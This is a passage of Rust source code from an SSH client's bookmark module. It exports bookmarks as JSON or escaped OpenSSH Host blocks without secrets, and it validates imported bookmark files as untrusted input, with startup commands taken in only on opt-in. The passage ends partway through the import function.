//! Bookmark export and import.
//!
//! **Export** builds either the versioned JSON envelope
//! `{format:"shellfin-bookmarks", version:1, exportedAt, groups[], bookmarks[]}` or OpenSSH
//! `Host` blocks from the public [`BookmarksDto`]. Neither can contain a secret: the DTO has no
//! passwords, passphrases or keychain bindings, and `passwordSaved` is not written.
//!
//! **Import** treats the file as hostile: [`parse_import`] validates every field with the same
//! rules as `bookmark_save` / `group_save` (unknown fields are dropped, an unknown `color` becomes
//! "none" like on load), caps the number of entries and reports rejected entries; the store
//! method [`BookmarkStore::import`] regenerates all ids, maps groups by name, resolves jumps
//! between imported bookmarks, validates the final state and applies it in ONE atomic write.
//! [`BookmarkStore::import_preview`] describes a parsed file (counts, conflicts, its valid
//! startup commands) without writing; startup commands are only imported when the user opts in.

use super::*;

use serde_json::Map;

use crate::error::ImportInvalidReason;
use crate::ipc::dto::{
    BookmarksDto, BookmarksImportPreview, ExportSkipCode, ExportSkipped, ImportEntryKind,
    ImportInvalid, ImportInvalidCode, ImportStartupCommand, ImportStrategy,
};
use crate::ipc::secret::SensitiveText;

pub const EXPORT_FORMAT: &str = "shellfin-bookmarks";
pub const EXPORT_VERSION: u64 = 1;
/// Most bookmarks / groups one import file may hold.
pub const MAX_IMPORT_BOOKMARKS: usize = 5000;
pub const MAX_IMPORT_GROUPS: usize = 500;

// ---------------------------------------------------------------------------------------------
// export
// ---------------------------------------------------------------------------------------------

/// `YYYY-MM-DDTHH:MM:SSZ` for a Unix time in milliseconds.
pub fn rfc3339_utc(ms: i64) -> String {
    let secs = ms.div_euclid(1000);
    let days = secs.div_euclid(86_400);
    let rem = secs.rem_euclid(86_400);
    let (h, mi, s) = (rem / 3600, rem % 3600 / 60, rem % 60);
    // Days since 1970-01-01 -> civil date (H. Hinnant's algorithm).
    let z = days + 719_468;
    let era = z.div_euclid(146_097);
    let doe = z.rem_euclid(146_097);
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{y:04}-{m:02}-{d:02}T{h:02}:{mi:02}:{s:02}Z")
}

/// Bookmarks in display order: ungrouped first, then by group order; `order` inside a group.
fn display_order(dto: &BookmarksDto) -> Vec<&Bookmark> {
    let group_rank = |id: &Option<String>| -> i64 {
        match id {
            None => -1,
            Some(g) => dto
                .groups
                .iter()
                .find(|x| &x.id == g)
                .map_or(i64::MAX, |x| i64::from(x.order)),
        }
    };
    let mut list: Vec<&Bookmark> = dto.bookmarks.iter().collect();
    list.sort_by_key(|b| (group_rank(&b.group_id), b.order));
    list
}

/// The JSON envelope (pretty, trailing newline) and the number of bookmarks in it. Contains no
/// secrets by construction.
pub fn export_json(dto: &BookmarksDto, exported_at_ms: i64) -> (Vec<u8>, u32) {
    let mut groups: Vec<_> = dto.groups.iter().collect();
    groups.sort_by_key(|g| g.order);
    let groups: Vec<Value> = groups
        .into_iter()
        .map(|g| serde_json::json!({ "id": g.id, "name": g.name }))
        .collect();
    let list = display_order(dto);
    let bookmarks: Vec<Value> = list
        .iter()
        .map(|b| {
            let auth = match &b.auth {
                AuthConfig::Auto => serde_json::json!({ "method": "auto" }),
                AuthConfig::Agent => serde_json::json!({ "method": "agent" }),
                // `passwordSaved` is deliberately not exported.
                AuthConfig::Password { .. } => serde_json::json!({ "method": "password" }),
                AuthConfig::Key { identity_file } => {
                    serde_json::json!({ "method": "key", "identityFile": identity_file })
                }
            };
            serde_json::json!({
                "id": b.id,
                "name": b.name,
                "host": b.host,
                "port": b.port,
                "user": b.user,
                "auth": auth,
                "proxyJump": b.proxy_jump,
                "groupId": b.group_id,
                "tags": b.tags,
                "startDir": b.start_dir,
                "useSshConfig": b.use_ssh_config,
                "color": b.color,
                "uploadLimitKiBps": b.upload_limit_kibps,
                "downloadLimitKiBps": b.download_limit_kibps,
                // `startupCommand` is exported (the user's own file) but only imported back
                // when the user opts in for that import.
                "confirmConnect": b.confirm_connect,
                "startupCommand": b.startup_command.as_ref().map(SensitiveText::expose),
                "notes": b.notes,
            })
        })
        .collect();
    let count = u32::try_from(bookmarks.len()).unwrap_or(u32::MAX);
    let doc = serde_json::json!({
        "format": EXPORT_FORMAT,
        "version": EXPORT_VERSION,
        "exportedAt": rfc3339_utc(exported_at_ms),
        "groups": groups,
        "bookmarks": bookmarks,
    });
    let mut bytes = serde_json::to_vec_pretty(&doc).unwrap_or_default();
    bytes.push(b'\n');
    (bytes, count)
}

/// Control characters (incl. NUL, DEL, C1) and the Unicode line separators: a value holding one
/// could end the ssh_config line and start a new directive.
fn has_line_break_or_control(s: &str) -> bool {
    s.chars()
        .any(|c| c.is_control() || matches!(c, '\u{2028}' | '\u{2029}'))
}

/// One ssh_config argument: plain when it only has safe characters, otherwise double-quoted with
/// `\` and `"` escaped (OpenSSH's `argv_split` unescapes exactly these inside quotes). `None` for
/// values that cannot be written safely (control characters, empty).
fn ssh_value(v: &str) -> Option<String> {
    if v.is_empty() || has_line_break_or_control(v) {
        return None;
    }
    let plain = v.chars().all(|c| {
        c.is_ascii_alphanumeric()
            || matches!(c, '.' | '_' | '-' | '@' | '+' | ':' | '/' | '~' | '=' | ',')
    }) && !v.starts_with('-');
    if plain {
        return Some(v.to_owned());
    }
    let mut out = String::with_capacity(v.len() + 2);
    out.push('"');
    for c in v.chars() {
        if matches!(c, '"' | '\\') {
            out.push('\\');
        }
        out.push(c);
    }
    out.push('"');
    Some(out)
}

/// `Host` alias for a bookmark name: `[A-Za-z0-9._-]` only, unique among `taken` (case-insens.).
fn host_alias(name: &str, taken: &HashSet<String>) -> String {
    let mut base: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') {
                c
            } else if c.is_whitespace() {
                '-'
            } else {
                '_'
            }
        })
        .take(64)
        .collect();
    base = base.trim_start_matches('-').to_owned();
    if base.is_empty() {
        base = "host".to_owned();
    }
    let mut alias = base.clone();
    let mut n = 2;
    while taken.contains(&alias.to_lowercase()) {
        alias = format!("{base}-{n}");
        n += 1;
    }
    alias
}

/// OpenSSH `Host` blocks for the bookmarks, the number written and what could not be
/// represented (reported, never silently dropped).
pub fn export_ssh_config(
    dto: &BookmarksDto,
    exported_at_ms: i64,
) -> (String, u32, Vec<ExportSkipped>) {
    let list = display_order(dto);
    let mut taken: HashSet<String> = HashSet::new();
    let mut alias_of: HashMap<&str, String> = HashMap::new();
    for b in &list {
        let alias = host_alias(&b.name, &taken);
        taken.insert(alias.to_lowercase());
        alias_of.insert(b.id.as_str(), alias);
    }
    let mut out = format!(
        "# Exported by Shellfin on {}\n# Passwords and passphrases are never exported.\n",
        rfc3339_utc(exported_at_ms)
    );
    let mut skipped = Vec::new();
    for b in &list {
        let mut skip = |field: &str, code: ExportSkipCode| {
            skipped.push(ExportSkipped {
                name: b.name.clone(),
                field: field.to_owned(),
                code,
            });
        };
        let Some(alias) = alias_of.get(b.id.as_str()) else {
            continue;
        };
        out.push_str(&format!("\nHost {alias}\n"));
        match ssh_value(&b.host) {
            Some(h) => out.push_str(&format!("    HostName {h}\n")),
            None => skip("host", ExportSkipCode::UnsafeValue),
        }
        if let Some(p) = b.port {
            out.push_str(&format!("    Port {p}\n"));
        }
        if let Some(u) = &b.user {
            // OpenSSH expands `%` tokens in User too (`%%` is a literal `%`).
            match ssh_value(&u.replace('%', "%%")) {
                Some(u) => out.push_str(&format!("    User {u}\n")),
                None => skip("user", ExportSkipCode::UnsafeValue),
            }
        }
        match &b.auth {
            AuthConfig::Key { identity_file } => {
                // `%` starts a token in IdentityFile; keep the path literal.
                match ssh_value(&identity_file.replace('%', "%%")) {
                    Some(f) => {
                        out.push_str(&format!("    IdentityFile {f}\n    IdentitiesOnly yes\n"));
                    }
                    None => skip("auth.identityFile", ExportSkipCode::UnsafeValue),
                }
            }
            AuthConfig::Password { .. } => {
                out.push_str("    PreferredAuthentications password,keyboard-interactive\n");
            }
            AuthConfig::Auto | AuthConfig::Agent => {}
        }
        let jump = match &b.proxy_jump {
            None => None,
            Some(JumpRef::Spec { spec }) => Some(ssh_value(spec)),
            Some(JumpRef::SshConfig { alias }) => Some(ssh_value(alias)),
            Some(JumpRef::Bookmark { id }) => Some(alias_of.get(id.as_str()).cloned()),
        };
        match jump {
            None => {}
            Some(Some(j)) => out.push_str(&format!("    ProxyJump {j}\n")),
            Some(None) => skip("proxyJump", ExportSkipCode::NotRepresentable),
        }
        if b.group_id.is_some() {
            skip("groupId", ExportSkipCode::NotRepresentable);
        }
        if !b.tags.is_empty() {
            skip("tags", ExportSkipCode::NotRepresentable);
        }
        if b.start_dir.is_some() {
            skip("startDir", ExportSkipCode::NotRepresentable);
        }
        if b.color.is_some() {
            skip("color", ExportSkipCode::NotRepresentable);
        }
        if b.upload_limit_kibps.is_some() {
            skip("uploadLimitKiBps", ExportSkipCode::NotRepresentable);
        }
        if b.download_limit_kibps.is_some() {
            skip("downloadLimitKiBps", ExportSkipCode::NotRepresentable);
        }
        if b.confirm_connect {
            skip("confirmConnect", ExportSkipCode::NotRepresentable);
        }
        if b.startup_command.is_some() {
            skip("startupCommand", ExportSkipCode::NotRepresentable);
        }
        if b.notes.is_some() {
            skip("notes", ExportSkipCode::NotRepresentable);
        }
    }
    let count = u32::try_from(list.len()).unwrap_or(u32::MAX);
    (out, count, skipped)
}

// ---------------------------------------------------------------------------------------------
// import: parsing and validation of the hostile file
// ---------------------------------------------------------------------------------------------

#[derive(Debug)]
struct ParsedGroup {
    /// The id used inside the file (only a reference; never stored).
    ref_id: String,
    name: String,
}

#[derive(Debug)]
struct ParsedBookmark {
    index: u32,
    /// `id` / `groupId` / jump ids are file references until [`BookmarkStore::import`] maps them.
    /// Always without a startup command; the file's one is in `startup_command`.
    bm: StoredBookmark,
    /// The entry carried a non-empty `startupCommand` (dropped unless the user opts in and it
    /// is valid).
    had_startup_command: bool,
    /// The entry's `startupCommand` when it passes the `bookmark_save` rules (imported only
    /// with `keep_startup_commands`).
    startup_command: Option<SensitiveText>,
}

/// A validated import file.
#[derive(Debug)]
pub struct ParsedImport {
    groups: Vec<ParsedGroup>,
    bookmarks: Vec<ParsedBookmark>,
    /// Entries rejected while parsing.
    invalid: Vec<ImportInvalid>,
}

impl ParsedImport {
    /// Number of bookmarks that passed validation.
    pub fn valid_bookmarks(&self) -> usize {
        self.bookmarks.len()
    }
}

fn refuse(reason: ImportInvalidReason) -> AppError {
    AppError::new(ErrorCode::ImportInvalidFile { reason })
}

type FieldResult<T> = Result<T, (String, ImportInvalidCode)>;

fn bad<T>(field: &str, code: ImportInvalidCode) -> FieldResult<T> {
    Err((field.to_owned(), code))
}

fn req_str<'a>(o: &'a Map<String, Value>, key: &str, field: &str) -> FieldResult<&'a str> {
    match o.get(key) {
        None | Some(Value::Null) => bad(field, ImportInvalidCode::Missing),
        Some(Value::String(s)) => Ok(s),
        Some(_) => bad(field, ImportInvalidCode::WrongType),
    }
}

fn opt_str<'a>(o: &'a Map<String, Value>, key: &str, field: &str) -> FieldResult<Option<&'a str>> {
    match o.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::String(s)) => Ok(Some(s)),
        Some(_) => bad(field, ImportInvalidCode::WrongType),
    }
}

fn opt_limit(o: &Map<String, Value>, key: &str) -> FieldResult<Option<u32>> {
    match o.get(key) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::Number(n)) => n
            .as_u64()
            .and_then(|v| u32::try_from(v).ok())
            .filter(|v| *v <= crate::storage::settings::ranges::TRANSFER_LIMIT_KIBPS.1)
            .map(Some)
            .ok_or_else(|| (key.to_owned(), ImportInvalidCode::Invalid)),
        Some(_) => bad(key, ImportInvalidCode::WrongType),
    }
}

fn parse_group(o: &Map<String, Value>) -> FieldResult<ParsedGroup> {
    let id = req_str(o, "id", "id")?;
    if !valid_id(id) {
        return bad("id", ImportInvalidCode::Invalid);
    }
    let name = req_str(o, "name", "name")?.trim();
    if !valid_name(name) {
        return bad("name", ImportInvalidCode::Invalid);
    }
    Ok(ParsedGroup {
        ref_id: id.to_owned(),
        name: name.to_owned(),
    })
}

fn parse_auth(o: &Map<String, Value>) -> FieldResult<StoredAuth> {
    let a = match o.get("auth") {
        None | Some(Value::Null) => return Ok(StoredAuth::Auto),
        Some(Value::Object(a)) => a,
        Some(_) => return bad("auth", ImportInvalidCode::WrongType),
    };
    match req_str(a, "method", "auth.method")? {
        "auto" => Ok(StoredAuth::Auto),
        "agent" => Ok(StoredAuth::Agent),
        // A saved password is never imported.
        "password" => Ok(StoredAuth::Password {
            password_saved: false,
            password_binding: None,
        }),
        "key" => {
            let f = req_str(a, "identityFile", "auth.identityFile")?.trim();
            if !valid_path_text(f) {
                return bad("auth.identityFile", ImportInvalidCode::Invalid);
            }
            Ok(StoredAuth::Key {
                identity_file: f.to_owned(),
            })
        }
        _ => bad("auth.method", ImportInvalidCode::Invalid),
    }
}

fn parse_jump(o: &Map<String, Value>) -> FieldResult<Option<JumpRef>> {
    let j = match o.get("proxyJump") {
        None | Some(Value::Null) => return Ok(None),
        Some(Value::Object(j)) => j,
        Some(_) => return bad("proxyJump", ImportInvalidCode::WrongType),
    };
    match req_str(j, "kind", "proxyJump.kind")? {
        "sshConfig" => {
            let alias = req_str(j, "alias", "proxyJump.alias")?;
            if !valid_hostname(alias) {
                return bad("proxyJump", ImportInvalidCode::Invalid);
            }
            Ok(Some(JumpRef::SshConfig {
                alias: alias.to_owned(),
            }))
        }
        "bookmark" => {
            let id = req_str(j, "id", "proxyJump.id")?;
            if !valid_id(id) {
                return bad("proxyJump", ImportInvalidCode::Invalid);
            }
            Ok(Some(JumpRef::Bookmark { id: id.to_owned() }))
        }
        "spec" => {
            let spec = req_str(j, "spec", "proxyJump.spec")?.trim();
            if !validate_jump_spec(spec) {
                return bad("proxyJump", ImportInvalidCode::Invalid);
            }
            Ok(Some(JumpRef::Spec {
                spec: spec.to_owned(),
            }))
        }
        _ => bad("proxyJump.kind", ImportInvalidCode::Invalid),
    }
}

fn parse_tags(o: &Map<String, Value>) -> FieldResult<Vec<String>> {
    let items = match o.get("tags") {
        None | Some(Value::Null) => return Ok(Vec::new()),
        Some(Value::Array(a)) => a,
        Some(_) => return bad("tags", ImportInvalidCode::WrongType),
    };
    if items.len() > MAX_TAGS {
        return bad("tags", ImportInvalidCode::Invalid);
    }
    let mut tags = Vec::with_capacity(items.len());
    for t in items {
        let Value::String(t) = t else {
            return bad("tags", ImportInvalidCode::WrongType);
        };
        let t = t.trim();
        let n = t.chars().count();
        if !(1..=MAX_TAG_CHARS).contains(&n) || t.chars().any(char::is_control) {
            return bad("tags", ImportInvalidCode::Invalid);
        }
        tags.push(t.to_owned());
    }
    Ok(tags)
}

/// One bookmark with the `bookmark_save` rules. `group_refs` = valid group ids of this file.
fn parse_bookmark(
    o: &Map<String, Value>,
    group_refs: &HashSet<String>,
) -> FieldResult<StoredBookmark> {
    let id = req_str(o, "id", "id")?;
    if !valid_id(id) {
        return bad("id", ImportInvalidCode::Invalid);
    }
    let name = req_str(o, "name", "name")?.trim();
    if !valid_name(name) {
        return bad("name", ImportInvalidCode::Invalid);
    }
    let host = req_str(o, "host", "host")?.trim();
    if !valid_hostname(host) {
        return bad("host", ImportInvalidCode::Invalid);
    }
    let port = match o.get("port") {
        None | Some(Value::Null) => None,
        Some(Value::Number(n)) => Some(
            n.as_u64()
                .and_then(|p| u16::try_from(p).ok())
                .filter(|p| *p != 0)
                .ok_or_else(|| ("port".to_owned(), ImportInvalidCode::Invalid))?,
        ),
        Some(_) => return bad("port", ImportInvalidCode::WrongType),
    };
    let user = match opt_str(o, "user", "user")?.map(str::trim) {
        None | Some("") => None,
        Some(u) if valid_user(u) => Some(u.to_owned()),
        Some(_) => return bad("user", ImportInvalidCode::Invalid),
    };
    let auth = parse_auth(o)?;
    let proxy_jump = parse_jump(o)?;
    let group_id = match opt_str(o, "groupId", "groupId")? {
        None => None,
        Some(g) if group_refs.contains(g) => Some(g.to_owned()),
        Some(_) => return bad("groupId", ImportInvalidCode::UnresolvedReference),
    };
    let tags = parse_tags(o)?;
    let start_dir = match opt_str(o, "startDir", "startDir")?.map(str::trim) {
        None | Some("") => None,
        Some(d) if valid_path_text(d) => Some(d.to_owned()),
        Some(_) => return bad("startDir", ImportInvalidCode::Invalid),
    };
    let use_ssh_config = match o.get("useSshConfig") {
        None | Some(Value::Null) => false,
        Some(Value::Bool(b)) => *b,
        Some(_) => return bad("useSshConfig", ImportInvalidCode::WrongType),
    };
    // Like on load: an unknown colour is "no colour", not a reason to drop the bookmark.
    let color = o
        .get("color")
        .and_then(|c| serde_json::from_value::<BookmarkColor>(c.clone()).ok());
    // `startupCommand` is deliberately not read here: see `file_startup_command` (opt-in).
    let confirm_connect = match o.get("confirmConnect") {
        None | Some(Value::Null) => false,
        Some(Value::Bool(b)) => *b,
        Some(_) => return bad("confirmConnect", ImportInvalidCode::WrongType),
    };
    let notes = match opt_str(o, "notes", "notes")? {
        None => None,
        Some(n) if n.trim().is_empty() => None,
        Some(n) if valid_notes(n) => Some(n.to_owned()),
        Some(_) => return bad("notes", ImportInvalidCode::Invalid),
    };
    Ok(StoredBookmark {
        id: id.to_owned(),
        name: name.to_owned(),
        host: host.to_owned(),
        port,
        user,
        auth,
        proxy_jump,
        group_id,
        tags,
        start_dir,
        use_ssh_config,
        color,
        order: i32::MAX,
        upload_limit_kibps: opt_limit(o, "uploadLimitKiBps")?,
        download_limit_kibps: opt_limit(o, "downloadLimitKiBps")?,
        confirm_connect,
        startup_command: None,
        notes,
        created_at_ms: 0,
        updated_at_ms: 0,
    })
}

/// Did the file entry carry a startup command (any non-null value except a blank
/// string)? Such an entry is imported without it and reported.
fn had_startup_command(o: &Map<String, Value>) -> bool {
    match o.get("startupCommand") {
        None | Some(Value::Null) => false,
        Some(Value::String(s)) => !s.trim().is_empty(),
        Some(_) => true,
    }
}

/// The entry's startup command when `bookmark_save` would store it: a string, blank = none,
/// one valid line (≤ 1024 chars, no control characters, no U+2028/2029). Anything else is
/// `None`; such a command is never imported, and [`had_startup_command`] reports it.
fn file_startup_command(o: &Map<String, Value>) -> Option<SensitiveText> {
    let Some(Value::String(s)) = o.get("startupCommand") else {
        return None;
    };
    startup_command_or_none(Some(SensitiveText::new(s.as_str())))
        .filter(|c| valid_startup_command(c.expose()))
}

/// Validate an import file (already read, at most `IMPORT_MAX_BYTES`). Whole-file problems are
/// `importInvalidFile{reason}`; bad entries are collected in [`ParsedImport`].
pub fn parse_import(bytes: &[u8]) -> Result<ParsedImport, AppError> {
    if u64::try_from(bytes.len()).unwrap_or(u64::MAX)
        > crate::platform::file_trust::IMPORT_MAX_BYTES
    {
        return Err(refuse(ImportInvalidReason::TooLarge));
    }
    // serde_json limits nesting to 128 levels, so a deeply nested file fails here, not on the stack.
    // A UTF-8 BOM (Notepad, PowerShell 5.1) is not JSON; skip one.
    let doc: Value = serde_json::from_slice(crate::storage::file::strip_bom(bytes))
        .map_err(|_| refuse(ImportInvalidReason::NotJson))?;
    let Value::Object(root) = doc else {
        return Err(refuse(ImportInvalidReason::BadStructure));
    };
    if root.get("format").and_then(Value::as_str) != Some(EXPORT_FORMAT) {
        return Err(refuse(ImportInvalidReason::UnknownFormat));
    }
    match root.get("version") {
        Some(Value::Number(n)) if n.as_u64() == Some(EXPORT_VERSION) => {}
        Some(Value::Number(_)) => return Err(refuse(ImportInvalidReason::UnsupportedVersion)),
        _ => return Err(refuse(ImportInvalidReason::BadStructure)),
    }
    let array = |key: &str| -> Result<&[Value], AppError> {
        match root.get(key) {
            None | Some(Value::Null) => Ok(&[]),
            Some(Value::Array(a)) => Ok(a.as_slice()),
            Some(_) => Err(refuse(ImportInvalidReason::BadStructure)),
        }
    };
    let raw_groups = array("groups")?;
    let raw_bookmarks = array("bookmarks")?;
    if raw_groups.len() > MAX_IMPORT_GROUPS || raw_bookmarks.len() > MAX_IMPORT_BOOKMARKS {
        return Err(refuse(ImportInvalidReason::TooMany));
    }

    let mut invalid = Vec::new();
    let reject = |invalid: &mut Vec<ImportInvalid>,
                  entry: ImportEntryKind,
                  index: usize,
                  (field, code): (String, ImportInvalidCode)| {
        invalid.push(ImportInvalid {
            entry,
            index: u32::try_from(index).unwrap_or(u32::MAX),
            field,
            code,
        });
    };

    let mut groups: Vec<ParsedGroup> = Vec::new();
    let mut group_ids: HashSet<String> = HashSet::new();
    for (i, v) in raw_groups.iter().enumerate() {
        let Value::Object(o) = v else {
            reject(
                &mut invalid,
                ImportEntryKind::Group,
                i,
                (String::new(), ImportInvalidCode::WrongType),
            );
            continue;
        };
        match parse_group(o) {
            Ok(g) if group_ids.insert(g.ref_id.clone()) => groups.push(g),
            Ok(_) => reject(
                &mut invalid,
                ImportEntryKind::Group,
                i,
                ("id".to_owned(), ImportInvalidCode::DuplicateId),
            ),
            Err(e) => reject(&mut invalid, ImportEntryKind::Group, i, e),
        }
    }

    let mut bookmarks: Vec<ParsedBookmark> = Vec::new();
    let mut bookmark_ids: HashSet<String> = HashSet::new();
    for (i, v) in raw_bookmarks.iter().enumerate() {
        let Value::Object(o) = v else {
            reject(
                &mut invalid,
                ImportEntryKind::Bookmark,
                i,
                (String::new(), ImportInvalidCode::WrongType),
            );
            continue;
        };
        match parse_bookmark(o, &group_ids) {
            Ok(bm) if bookmark_ids.insert(bm.id.clone()) => bookmarks.push(ParsedBookmark {
                index: u32::try_from(i).unwrap_or(u32::MAX),
                bm,
                had_startup_command: had_startup_command(o),
                startup_command: file_startup_command(o),
            }),
            Ok(_) => reject(
                &mut invalid,
                ImportEntryKind::Bookmark,
                i,
                ("id".to_owned(), ImportInvalidCode::DuplicateId),
            ),
            Err(e) => reject(&mut invalid, ImportEntryKind::Bookmark, i, e),
        }
    }
    Ok(ParsedImport {
        groups,
        bookmarks,
        invalid,
    })
}

// ---------------------------------------------------------------------------------------------
// import: applying to the store
// ---------------------------------------------------------------------------------------------

/// What an import did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImportOutcome {
    pub added: u32,
    pub replaced: u32,
    pub skipped: u32,
    pub invalid: Vec<ImportInvalid>,
    /// Replaced bookmarks whose saved password no longer applies: delete keychain `bookmark:<id>`.
    pub forget_password: Vec<String>,
    /// Ids of replaced bookmarks (open sessions may need a live update).
    pub replaced_ids: Vec<String>,
    pub changed: bool,
    /// Final names of imported bookmarks whose `startupCommand` was dropped.
    pub startup_commands_stripped: Vec<String>,
}

struct Entry {
    index: u32,
    id: String,
    replace: bool,
    /// File reference of the bookmark this one jumps through.
    jump_ref: Option<String>,
    /// The file entry's startup command was dropped.
    stripped: bool,
    /// The bookmark carries the file's startup command (the user opted in).
    command_from_file: bool,
}

/// Take rejected entries (`(index into entries, field, code)`) out of the working set in one
/// pass: a replaced one gets its original back, a new one is removed. Entries that jump through
/// a removed one (directly or transitively, found through the reverse jump graph) are rejected
/// in the same step as `unresolvedReference`.
fn apply_rejections(
    work: &mut Vec<StoredBookmark>,
    originals: &HashMap<String, StoredBookmark>,
    entries: &[Entry],
    invalid: &mut Vec<ImportInvalid>,
    rejected: &mut HashSet<String>,
    mut reject: Vec<(usize, String, ImportInvalidCode)>,
) {
    if reject.is_empty() {
        return;
    }
    // Reverse graph over the live entries: jump target id → entries jumping through it.
    let mut dependents: HashMap<&str, Vec<usize>> = HashMap::new();
    let entry_by_id: HashMap<&str, usize> = entries
        .iter()
        .enumerate()
        .map(|(i, e)| (e.id.as_str(), i))
        .collect();
    for b in work.iter() {
        if let (Some(JumpRef::Bookmark { id }), Some(&i)) =
            (&b.proxy_jump, entry_by_id.get(b.id.as_str()))
        {
            dependents.entry(id.as_str()).or_default().push(i);
        }
    }
    let mut removed: HashSet<String> = HashSet::new();
    let mut restored: HashSet<String> = HashSet::new();
    let mut k = 0;
    while let Some((i, field, code)) = reject.get(k).cloned() {
        k += 1;
        let Some(e) = entries.get(i) else { continue };
        if !rejected.insert(e.id.clone()) {
            continue;
        }
        invalid.push(ImportInvalid {
            entry: ImportEntryKind::Bookmark,
            index: e.index,
            field,
            code,
        });
        if e.replace && originals.contains_key(&e.id) {
            restored.insert(e.id.clone());
        } else {
            removed.insert(e.id.clone());
            for &d in dependents.get(e.id.as_str()).into_iter().flatten() {
                reject.push((
                    d,
                    "proxyJump".to_owned(),
                    ImportInvalidCode::UnresolvedReference,
                ));
            }
        }
    }
    work.retain(|b| !removed.contains(&b.id));
    for slot in work.iter_mut() {
        if restored.contains(&slot.id)
            && let Some(orig) = originals.get(&slot.id)
        {
            *slot = orig.clone();
        }
    }
}

/// `name (2)`, `name (3)`, … that is not `taken`, within [`MAX_NAME_CHARS`].
fn unique_name(base: &str, taken: impl Fn(&str) -> bool) -> Option<String> {
    let mut n = 2;
    loop {
        if n > MAX_NAME_SUFFIX {
            return None;
        }
        let suffix = format!(" ({n})");
        let keep = MAX_NAME_CHARS - suffix.chars().count();
        let name = format!("{}{suffix}", base.chars().take(keep).collect::<String>());
        if !taken(&name.to_lowercase()) {
            return Some(name);
        }
        n += 1;
    }
}

impl BookmarkStore {
    /// Describe a parsed import without changing anything: the valid entries, how many of
    /// them conflict by name (case-insensitive) with the store as it is now, the parse-stage
    /// rejections and every valid startup command of the file (with its name in the file and
    /// whether that name exists, the same test as `conflicts`).
    /// `token` is left `None` for the caller (it is issued when the import is kept pending).
    pub fn import_preview(&self, parsed: &ParsedImport) -> BookmarksImportPreview {
        let names: HashSet<String> = self
            .bookmarks
            .iter()
            .map(|b| b.name.to_lowercase())
            .collect();
        let exists = |pb: &ParsedBookmark| names.contains(&pb.bm.name.to_lowercase());
        let conflicts = parsed.bookmarks.iter().filter(|pb| exists(pb)).count();
        let startup_commands = parsed
            .bookmarks
            .iter()
            .filter_map(|pb| {
                pb.startup_command
                    .as_ref()
                    .map(|command| ImportStartupCommand {
                        name: pb.bm.name.clone(),
                        command: command.clone(),
                        exists: exists(pb),
                    })
            })
            .collect();
        BookmarksImportPreview {
            picked: true,
            token: None,
            bookmarks: u32::try_from(parsed.bookmarks.len()).unwrap_or(u32::MAX),
            conflicts: u32::try_from(conflicts).unwrap_or(u32::MAX),
            invalid: parsed.invalid.clone(),
            startup_commands,
        }
    }

    /// Apply a validated import in ONE atomic write. Conflict = a bookmark with the same name
    /// (names are unique store-wide, case-insensitive). Refused for a read-only store.
    /// `keep_startup_commands` (the user opted in) imports the file's valid startup commands;
    /// without it no command comes from the file.
    pub fn import(
        &mut self,
        parsed: ParsedImport,
        strategy: ImportStrategy,
        keep_startup_commands: bool,
        now_ms: i64,
    ) -> Result<ImportOutcome, AppError> {
        self.ensure_writable()?;
        let ParsedImport {
            groups: parsed_groups,
            bookmarks: parsed_bookmarks,
            mut invalid,
        } = parsed;

        // Groups map by name (case-insensitive); missing ones are created.
        let mut groups = self.groups.clone();
        let mut group_map: HashMap<String, String> = HashMap::new();
        for g in &parsed_groups {
            let lower = g.name.to_lowercase();
            let id = match groups.iter().find(|x| x.name.to_lowercase() == lower) {
                Some(x) => x.id.clone(),
                None => {
                    let created = StoredGroup {
                        id: new_id(),
                        name: g.name.clone(),
                        order: i32::MAX,
                    };
                    let id = created.id.clone();
                    groups.push(created);
                    id
                }
            };
            group_map.insert(g.ref_id.clone(), id);
        }

        let originals: HashMap<String, StoredBookmark> = self
            .bookmarks
            .iter()
            .map(|b| (b.id.clone(), b.clone()))
            .collect();
        let mut work = self.bookmarks.clone();
        // Lower-cased name → position in `work`, kept up to date below (no O(n) scan with an
        // allocation per comparison for every imported entry).
        let mut name_pos: HashMap<String, usize> = HashMap::with_capacity(work.len());
        for (i, b) in work.iter().enumerate() {
            name_pos.entry(b.name.to_lowercase()).or_insert(i);
        }
        let mut id_map: HashMap<String, String> = HashMap::new();
        let mut entries: Vec<Entry> = Vec::new();
        let mut skipped = 0u32;

        for pb in parsed_bookmarks {
            let index = pb.index;
            let file_command = if keep_startup_commands {
                pb.startup_command
            } else {
                None
            };
            let command_from_file = file_command.is_some();
            // Without the opt-in every command is dropped; with it only an invalid one.
            let stripped = pb.had_startup_command && !command_from_file;
            let mut cand = pb.bm;
            // Validated again with the final state below (`validate_bookmark_in`).
            cand.startup_command = file_command;
            let ref_id = cand.id.clone();
            let jump_ref = match &cand.proxy_jump {
                Some(JumpRef::Bookmark { id }) => Some(id.clone()),
                _ => None,
            };
            if jump_ref.is_some() {
                cand.proxy_jump = None; // resolved below, once every id is known
            }
            cand.group_id = cand
                .group_id
                .as_ref()
                .and_then(|g| group_map.get(g).cloned());
            cand.created_at_ms = now_ms;
            cand.updated_at_ms = now_ms;
            let lower = cand.name.to_lowercase();
            let conflict = name_pos.get(&lower).copied();
            let existing = conflict.and_then(|p| work.get(p).cloned());
            let (replace, id) = match (conflict, existing, strategy) {
                (Some(_), Some(old), ImportStrategy::Skip) => {
                    id_map.insert(ref_id, old.id);
                    skipped += 1;
                    continue;
                }
                // Replacing something added earlier by this same import is a plain skip.
                (Some(_), Some(old), ImportStrategy::Replace)
                    if !originals.contains_key(&old.id) =>
                {
                    id_map.insert(ref_id, old.id);
                    skipped += 1;
                    continue;
                }
                (Some(pos), Some(old), ImportStrategy::Replace) => {
                    cand.id = old.id.clone();
                    cand.created_at_ms = old.created_at_ms;
                    // Without a command taken from the file, keep the user's own one (dropped
                    // below if the file changes the server or account).
                    if !command_from_file {
                        cand.startup_command = old.startup_command.clone();
                    }
                    if old.group_id == cand.group_id {
                        cand.order = old.order;
                    }
                    if let Some(slot) = work.get_mut(pos) {
                        *slot = cand;
                    }
